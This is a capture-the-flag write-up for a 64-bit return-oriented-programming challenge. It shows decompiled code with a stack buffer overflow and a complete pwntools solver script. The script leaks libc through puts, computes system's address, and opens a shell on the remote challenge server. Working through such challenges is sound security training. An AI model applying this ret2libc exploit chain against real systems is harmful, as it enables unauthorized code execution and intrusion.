# Return to ROP

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Given an ELF file and also the OS to run the program, that means we don't have to go through the steps to leak libc. if we run the file:

<figure><img src="../../../.gitbook/assets/unknown (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we see the program prints **two addresses**. Then we proceed to decompile the program:

main:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  printf("Here's a little secret to get you started: %p\n", main);
  puts("Welcome to the expert ROP challenge!");
  puts("Your goal: pop a shell and read flag.txt.");
  write_to_memory();
  vulnerable_function();
  puts("Goodbye!");
  return 0;
}
```

write\_to\_memory:

```c
int write_to_memory()
{
  printf("I have a buffer at %p, send me some data to store:\n", &bss_buffer);
  read(0, &bss_buffer, 0xFFu);
  return puts("Thanks, I've stored your data.");
}

```

vulnerable\_function:

```c
ssize_t vulnerable_function()
{
  _BYTE buf[128]; // [rsp+0h] [rbp-80h] BYREF

  printf("Now, show me what you've got: ");
  return read(0, buf, 0x200u);
}
```

from here, we get that the addresses that the program leaked was the **main** address and **.bss.** We also got a **BOF(Buffer Overflow)** vuln in **vulnerable\_function**.

so the exploit flow is like this: get leaked **main** and **.bss** address from the program -> write **"/bin/sh"** to **.bss** -> ROP chain to leak puts in libc -> calculate libc\_base using the leaked puts address -> call **system('/bin/sh')**.

solver.py:

```python
from pwn import *
import re, sys

BIN   = './rop_me_baby_patched'
LIBC  = './libc.so.6'
HOST, PORT = '18.136.199.188', 9009
USE_REMOTE = (len(sys.argv) > 1 and sys.argv[1] == 'r')

context.binary = ELF(BIN)
elf = context.binary
context.log_level = 'info'

# connect
p = remote(HOST, PORT) if USE_REMOTE else process(BIN)

# --- siklus 0: sync & ambil base + bss ---
p.recvuntil(b"Here's a little secret")
leak_main = int(re.search(rb'0x[0-9a-fA-F]+', p.recvline()).group(0), 16)
base = leak_main - elf.symbols['main']
elf.address = base
p.recvuntil(b"I have a buffer at ")
bss = int(re.search(rb'0x[0-9a-fA-F]+', p.recvline()).group(0), 16)
log.success(f"PIE base = {hex(base)}")
log.success(f".bss     = {hex(bss)}")

POP_RDI   = base + 0x1363
RET       = base + 0x101a
PUTS_PLT  = elf.plt['puts']
BACK_MAIN = elf.sym['main']
PUTS_GOT  = elf.got['puts']

# tulis "/bin/sh" ke bss dan masuk prompt BOF
p.send(b"/bin/sh\x00")
p.recvuntil(b"Thanks, I've stored your data.\n")
p.recvuntil(b"Now, show me what you've got: ")
binsh = bss  # kita taruh di awal buffer .bss yang dicetak

# --- siklus 1: leak puts@libc via puts(puts@GOT) ---
rop  = b'A'*0x88
rop += p64(POP_RDI) + p64(PUTS_GOT)
rop += p64(PUTS_PLT)
rop += p64(BACK_MAIN)
p.send(rop)

raw = p.recvline(keepends=False)
leak_puts = u64(raw.ljust(8, b'\x00'))
log.success(f"puts@libc = {hex(leak_puts)}")

# resync ke siklus berikutnya (program print banner lagi)
p.recvuntil(b"Here's a little secret")
_ = p.recvline()
p.recvuntil(b"I have a buffer at ")
_ = p.recvline()

# tulis lagi "/bin/sh", lalu prompt BOF
p.send(b"/bin/sh\x00")
p.recvuntil(b"Thanks, I've stored your data.\n")
p.recvuntil(b"Now, show me what you've got: ")

# hitung libc base + system
libc = ELF(LIBC)
libc_base   = leak_puts - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
log.success(f"libc base = {hex(libc_base)}")
log.success(f"system    = {hex(system_addr)}")

# --- siklus 2: system("/bin/sh") ---
rop  = b'B'*0x88
rop += p64(RET)
rop += p64(POP_RDI) + p64(binsh)
rop += p64(system_addr)
p.send(rop)

p.interactive()

```

If we run it, we get the flag:

<figure><img src="../../../.gitbook/assets/unknown (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Flag: RTRTNI25{Chaining\_Gadgets\_For\_Ultimate\_Power}
